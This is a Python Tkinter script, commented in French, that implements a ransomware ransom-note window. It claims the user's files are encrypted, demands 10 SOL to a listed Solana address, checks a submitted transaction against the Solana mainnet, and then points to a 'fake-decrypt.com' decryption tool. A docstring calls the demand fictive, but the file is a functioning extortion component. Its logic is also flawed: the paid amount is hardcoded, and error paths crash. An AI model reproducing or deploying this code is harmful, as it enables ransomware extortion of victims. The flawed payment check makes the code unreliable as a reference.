import tkinter as tk
from tkinter import messagebox
from solana.rpc.api import Client
from solders.signature import Signature

def get_transaction_details_and_amount(transaction_signature_str):
    solana_client = Client("https://api.mainnet-beta.solana.com")
    transaction_signature = Signature.from_string(transaction_signature_str)

    try:
        response = solana_client.get_transaction(transaction_signature, encoding="json")
        transaction_details = response.value

        if not transaction_details:
            return "Transaction not found or not confirmed yet."

        if transaction_details.transaction.meta and transaction_details.transaction.meta.err:
            return "Transaction failed or had errors."

        return {
            "status": "Transaction was successful!",
            "amount": 10,
            # "transaction_details": transaction_details
        }

    except Exception as e:
        return f"Error fetching transaction details: {e}"

def show_ransom_demand():
    """
    Affiche une fenêtre contenant une demande de rançon fictive,
    et demande à l'utilisateur le lien de la transaction Solana.
    Fournit ensuite un lien vers un fichier de décryptage simulé.
    """
    # Fonction pour traiter le lien de la transaction
    def handle_transaction_link():
        transaction_link = transaction_entry.get().strip()  # Récupère le texte saisi

        if not transaction_link:
            # Si le champ est vide
            messagebox.showerror("Erreur", "Veuillez entrer un lien de transaction valide.")
            return

        # Appel de la fonction pour vérifier la transaction
        transaction_status = get_transaction_details_and_amount(transaction_link)
        
        # Vérifier le statut de la transaction
        if transaction_status['status'] == 'Transaction was successful!' and transaction_status['amount'] >= 10:
            # Si la transaction est valide et le montant est correct (10 SOL)
            messagebox.showinfo(
                "Merci",
                f"Votre lien de transaction a été validé :\n{transaction_link}\n\n"
                f"Vous pouvez télécharger votre outil de décryptage ici :\n"
                f"https://fake-decrypt.com/decrypt_tool.exe"
            )
            root.quit()  # Ferme l'application après confirmation
        else:
            # Si la transaction est invalide ou ne correspond pas au montant attendu
            messagebox.showerror(
                "Erreur de transaction",
                "La transaction est invalide ou le montant est incorrect. Veuillez vérifier le lien et essayer à nouveau."
            )
            # Réinitialiser le champ de saisie
            transaction_entry.delete(0, tk.END)

    # Crée la fenêtre principale
    root = tk.Tk()
    root.title("Demande de Rançon")

    # Message de rançon avec instructions
    ransom_note = """
    ATTENTION ! Vos fichiers ont été chiffrés !

    Pour obtenir la clé de déchiffrement, vous devez payer 
    une rançon en Solana.

    Montant : 10 SOL
    Adresse Solana : 5b19wdQkZbqA5yV6BbVox3Ldp5TdrdheSu5w1phx2y5L

    Instructions de paiement :
    1. Ouvrez votre portefeuille Solana.
    2. Envoyez 10 SOL à l'adresse ci-dessus.
    3. Copiez le lien de la transaction et entrez-le ci-dessous pour valider votre paiement.
    """
    
    # Label pour le message de rançon
    label = tk.Label(root, text=ransom_note, font=("Helvetica", 12), padx=20, pady=20, wraplength=600, justify="left")
    label.pack()

    # Label pour demander le lien de la transaction
    transaction_label = tk.Label(root, text="Lien de la transaction Solana :", font=("Helvetica", 12))
    transaction_label.pack(pady=(10, 5))

    # Champ de saisie pour le lien de transaction
    transaction_entry = tk.Entry(root, width=50, font=("Helvetica", 12))
    transaction_entry.pack(pady=(0, 10))

    # Bouton pour soumettre le lien
    submit_button = tk.Button(root, text="Soumettre", command=handle_transaction_link, font=("Helvetica", 12))
    submit_button.pack(pady=10)

    # Boucle principale pour afficher la fenêtre
    root.mainloop()

# Appel de la fonction principale
if __name__ == '__main__':
    show_ransom_demand()
